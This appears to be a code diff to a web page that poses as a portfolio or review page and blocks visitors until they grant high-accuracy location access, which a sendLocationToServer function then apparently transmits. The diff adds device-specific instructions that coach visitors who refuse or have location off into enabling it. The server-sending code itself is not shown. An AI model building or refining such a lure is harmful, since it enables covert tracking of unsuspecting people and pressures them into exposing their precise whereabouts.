@@ -298,6 +298,22 @@
       line-height: 1.6;
     }
 
+    .modal-help {
+      display: none;
+      margin-top: 14px;
+      padding: 12px 14px;
+      border-radius: 16px;
+      background: rgba(16, 24, 32, 0.06);
+      color: var(--muted);
+      text-align: left;
+      line-height: 1.6;
+      font-size: 0.93rem;
+    }
+
+    .modal-help.show {
+      display: block;
+    }
+
     .modal-actions {
       display: flex;
       justify-content: center;
@@ -422,6 +438,7 @@
       <p>
         Location access is required to continue. If the browser prompt does not appear, check your browser site settings and tap the button again.
       </p>
+      <div class="modal-help" id="modalHelp"></div>
       <div class="modal-actions">
         <button class="primary" id="allowLocationBtn" type="button">Turn On Location</button>
         <button class="secondary" id="closeModalBtn" type="button">Not Now</button>
@@ -440,6 +457,7 @@
     const portfolioSection = document.getElementById("portfolio");
     const reviewSection = document.getElementById("reviewSection");
     const locationModal = document.getElementById("locationModal");
+    const modalHelp = document.getElementById("modalHelp");
     const allowLocationBtn = document.getElementById("allowLocationBtn");
     const closeModalBtn = document.getElementById("closeModalBtn");
     const targetUrl = "https://www.instagram.com/richeee.x/";
@@ -486,6 +504,8 @@
     }
 
     function openLocationModal() {
+      modalHelp.textContent = "";
+      modalHelp.className = "modal-help";
       locationModal.classList.add("is-open");
       locationModal.setAttribute("aria-hidden", "false");
     }
@@ -493,6 +513,22 @@
     function closeLocationModal() {
       locationModal.classList.remove("is-open");
       locationModal.setAttribute("aria-hidden", "true");
+    }
+
+    function getLocationHelpText() {
+      const ua = navigator.userAgent || "";
+      if (/android/i.test(ua)) {
+        return "Phone location service seems off or blocked. Open Quick Settings and turn on Location, or go to Settings > Location, then tap Turn On Location again.";
+      }
+      if (/iphone|ipad|ipod/i.test(ua)) {
+        return "Location appears to be off or blocked. Open Settings > Privacy & Security > Location Services, turn it on, allow location for your browser, then tap Turn On Location again.";
+      }
+      return "Location appears to be off or blocked. Turn on device location services and allow location for this site in the browser, then tap Turn On Location again.";
+    }
+
+    function showLocationHelp() {
+      modalHelp.textContent = getLocationHelpText();
+      modalHelp.className = "modal-help show";
     }
 
     async function sendLocationToServer(payload) {
@@ -681,6 +717,7 @@
         () => {
           setBusy(false);
           openLocationModal();
+          showLocationHelp();
         },
         {
           enableHighAccuracy: true,
